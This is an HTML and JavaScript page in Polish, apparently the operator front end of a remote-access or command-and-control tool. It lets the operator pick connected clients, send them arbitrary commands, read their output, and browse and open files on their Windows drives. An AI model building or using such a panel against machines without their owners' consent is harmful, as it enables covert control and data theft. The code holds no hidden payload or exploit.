<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Panel sterowania</title>
  <style>
    #fileExplorer {
      margin-top: 20px;
      border: 1px solid #ccc;
      padding: 10px;
      max-width: 600px;
    }
    #fileList {
      list-style: none;
      padding-left: 0;
      max-height: 300px;
      overflow-y: auto;
      border: 1px solid #ddd;
      margin-bottom: 10px;
    }
    #fileList li {
      cursor: pointer;
      padding: 4px;
    }
    #fileList li:hover {
      background-color: #f0f0f0;
    }
    #fileList li.directory::before {
      content: "📁 ";
    }
    #fileList li.file::before {
      content: "📄 ";
    }
    #fileContent {
      white-space: pre-wrap;
      background: #fafafa;
      border: 1px solid #ddd;
      padding: 10px;
      max-height: 300px;
      overflow-y: auto;
    }
    #currentPath {
      font-weight: bold;
      margin-bottom: 5px;
    }
  </style>
</head>
<body>
  <h1>Panel sterowania</h1>

  <div id="loginDiv">
    <input id="password" type="password" placeholder="Hasło panelu" />
    <button onclick="login()">Zaloguj</button>
  </div>

  <div id="panelDiv" style="display:none;">
    <h2>Klienci</h2>
    <select id="clientsSelect" onchange="selectClient()"></select>

    <button onclick="openExplorer()">Otwórz eksplorator plików</button>

    <h2>Wysyłanie komendy</h2>
    <input id="commandInput" type="text" placeholder="Komenda do wysłania" />
    <button onclick="sendCommand()">Wyślij komendę</button>

    <h2>Otrzymany wynik</h2>
    <pre id="resultOutput">Brak wyniku</pre>
    <button onclick="getResult()">Odśwież wynik</button>

    <hr />

    <h2>Eksplorator plików</h2>
    <div id="fileExplorer" style="display:none;">
      <div id="currentPath"></div>
      <ul id="fileList"></ul>
      <pre id="fileContent">Wybierz plik, aby zobaczyć zawartość</pre>
    </div>
  </div>

  <script>
    let loggedIn = false;
    let selectedClient = null;
    let apiToken = null;

    async function login() {
      const password = document.getElementById('password').value;
      const res = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password })
      });
      if (res.ok) {
        loggedIn = true;
        apiToken = prompt("Wpisz swój API_TOKEN (token autoryzacyjny):");
        document.getElementById('loginDiv').style.display = 'none';
        document.getElementById('panelDiv').style.display = 'block';
        loadClients();
      } else {
        alert('Błędne hasło!');
      }
    }

    async function loadClients() {
      if (!loggedIn) return alert('Zaloguj się najpierw!');
      const res = await fetch('/clients');
      const clients = await res.json();
      const select = document.getElementById('clientsSelect');
      select.innerHTML = '';
      clients.forEach(c => {
        const option = document.createElement('option');
        option.value = c;
        option.textContent = c;
        select.appendChild(option);
      });
      if (clients.length > 0) {
        selectedClient = clients[0];
      }
    }

    function selectClient() {
      const select = document.getElementById('clientsSelect');
      selectedClient = select.value;
      document.getElementById('resultOutput').textContent = 'Brak wyniku';
    }

    async function sendCommand() {
      if (!selectedClient) return alert('Wybierz klienta!');
      const command = document.getElementById('commandInput').value;
      if (!command) return alert('Wpisz komendę!');
      const res = await fetch('/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client: selectedClient, command })
      });
      if (res.ok) {
        alert('Komenda wysłana!');
        document.getElementById('commandInput').value = '';
      } else {
        alert('Błąd wysyłania komendy');
      }
    }

    async function getResult() {
      if (!selectedClient) return alert('Wybierz klienta!');
      const res = await fetch(`/result?client=${encodeURIComponent(selectedClient)}`);
      if (res.status === 200) {
        const text = await res.text();
        document.getElementById('resultOutput').textContent = text;
      } else {
        document.getElementById('resultOutput').textContent = 'Brak wyniku';
      }
    }

    // Eksplorator plików - pokazuje i ładuje pliki tylko po kliknięciu
    const fileListElem = document.getElementById('fileList');
    const fileContentElem = document.getElementById('fileContent');
    const currentPathElem = document.getElementById('currentPath');
    let currentPath = '';

    function pathEndsWithSlash(p) {
      return p.endsWith('\\') || p.endsWith('/');
    }

    async function openExplorer() {
      if (!selectedClient) return alert("Wybierz klienta, zanim otworzysz eksplorator!");
      if (!apiToken) return alert("Brak tokena API!");
      document.getElementById('fileExplorer').style.display = 'block';
      await loadFiles('C:\\'); // startujemy z C:\ dla Windows
    }

    async function loadFiles(path) {
      try {
        const res = await fetch(`/api/files?path=${encodeURIComponent(path)}`, {
          headers: { 'Authorization': `Bearer ${apiToken}` }
        });
        if (!res.ok) {
          alert(`Błąd pobierania plików: ${res.statusText}`);
          return;
        }
        const data = await res.json();
        currentPath = data.path;
        currentPathElem.textContent = `Ścieżka: ${currentPath}`;
        fileListElem.innerHTML = '';

        // Przycisk powrotu do katalogu wyżej
        if (path !== '' && path !== '/' && !path.match(/^[a-zA-Z]:\\?$/)) {
          const upLi = document.createElement('li');
          upLi.textContent = '.. (folder nadrzędny)';
          upLi.classList.add('directory');
          upLi.onclick = () => {
            const upPath = currentPath.split(/[\\/]/).slice(0, -1).join('\\');
            loadFiles(upPath || 'C:\\');
          };
          fileListElem.appendChild(upLi);
        }

        data.files.forEach(file => {
          const li = document.createElement('li');
          li.textContent = file.name;
          li.classList.add(file.isDirectory ? 'directory' : 'file');
          li.onclick = () => {
            if (file.isDirectory) {
              loadFiles(pathEndsWithSlash(path) ? path + file.name : path + '\\' + file.name);
              fileContentElem.textContent = 'Wybierz plik, aby zobaczyć zawartość';
            } else {
              loadFileContent(pathEndsWithSlash(path) ? path + file.name : path + '\\' + file.name);
            }
          };
          fileListElem.appendChild(li);
        });
      } catch (e) {
        alert('Błąd: ' + e.message);
      }
    }

    async function loadFileContent(filePath) {
      try {
        const res = await fetch(`/api/file?path=${encodeURIComponent(filePath)}`, {
          headers: { 'Authorization': `Bearer ${apiToken}` }
        });
        if (!res.ok) {
          fileContentElem.textContent = `Nie można wczytać pliku (${res.status})`;
          return;
        }
        const data = await res.json();
        fileContentElem.textContent = data.content;
      } catch (e) {
        fileContentElem.textContent = 'Błąd: ' + e.message;
      }
    }
  </script>
</body>
</html>
